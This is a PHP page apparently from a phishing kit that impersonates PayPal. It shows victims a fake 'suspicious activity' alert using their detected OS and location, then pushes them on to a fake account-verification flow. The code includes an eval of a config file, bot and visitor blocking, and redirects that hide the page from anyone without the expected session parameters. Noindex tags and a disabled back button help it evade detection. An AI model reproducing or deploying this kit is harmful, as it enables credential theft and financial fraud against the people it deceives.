<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if (isset($_GET['returnUri']) && isset($_GET['sessionId'])) {
  if ($_GET['returnUri'] != "unauthorised") {
    $api->redirect("success");
  }
  else
  if (strlen($_GET['sessionId']) != 50) {
    $api->redirect("success");
  }
}
else {
  $api->redirect("success");
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Activity");
?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->transcode("Suspicious activity - PayPal");?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="../assets/css/authflow_style.css">
<script type="text/javascript">
window.history.forward();

function noBack() {
window.history.forward();
}
</script>
</head>

<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
<div class="grey-background header-body">
<div id="header">
<div class="container-fluid center-block-big">
<table>
<tr>
<td>
<img src="../assets/img/favicon.svg" width="106" height="29">
</td>
<td align="right" width="100%">
</td>
</tr>
</table>
</div>
</div>
<div id="wrapper" class="page-container">
<div class="container-fluid trayNavOuter activity-tray activity-tray-large">
<div class="trayNavInner">
<div class="row row-ie">
<div class="col-md-5 logo-block">
<div class="row">
<div class="col-md-12 peek-shield">
<img src="../assets/img/shield.png">
</div>
</div>
<div class="row">
<div class="col-md-12">
<p class="logo-block-text"><?=$api->transcode("Your security is our priority. Hence, we regularly look for early signs of suspicious activity.");?></p>
</div>
</div>
</div>
<div class="col-md-7 explanation-wrapper">
<div class="row">
<div class="col-md-12">
<header>
<h4 class="flat-large-header"><?=$api->transcode("We're concerned about potential unauthorized activity");?></h4>
</header>
</div>
</div>
<div class="row">
<div class="col-md-12 explanation-block">
<p><?=$api->transcode("After you confirm your identity, we'll show you how to make your account more secure.");?></p>
</div>
</div>
<div class="row">
<div class="col-md-12">
<div class="activities details-box">
<div class="header row no-transactions white-header">
<label class="login-wrapper">
<span class="device"><?=$api->transcode("Login from ".$_SESSION['os']);?></span>
<span class="location span"><?=$api->transcode("Near ".$_SESSION['state'].", ".$_SESSION['code']);?></span>
<span class="time span"><?=$api->transcode(date('F j, Y', strtotime('-1 days'))." ".date('h:i A'));?></span>
</label>
</div>
</div>
</div>
<p style="padding-left:15px;"><?=$api->transcode("For your own safety, we want to make sure that this is your account");?></p>
<div class="buttons" style="padding-left:15px;">
<a class="btn btn-primary button" href="../myaccount/home?access_key=<?=$api->ngerandom();?>"><?=$api->transcode("Continue");?></a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<footer class="footer">
<div class="footer-nav">
<div class="site-links container-fluid" style="align: right">
<ul class="navlist">
<li><a href="#"><?=$api->transcode("Contact");?></a></li>
<li><a href="#"><?=$api->transcode("Security");?></a></li>
<li><a href="../logout"><?=$api->transcode("Log Out");?></a></li>
</ul>
</div>
</div>
<div class="footer-legal">
<div class="container-fluid">
<span class="copyright"><?=$api->transcode("Copyright © 1999 - ".gmdate('Y')." PayPal. All rights reserved");?></span>
<span class="short-copyright"><?=$api->transcode("© 1999 - ".gmdate('Y'));?></span>
<ul class="navlist footer-list">
<li><a href="#"><?=$api->transcode("Privacy");?></a></li>
<li><a href="#"><?=$api->transcode("Legal");?></a></li>
</ul>
</div>
</div>
</footer>
</body>

</html>
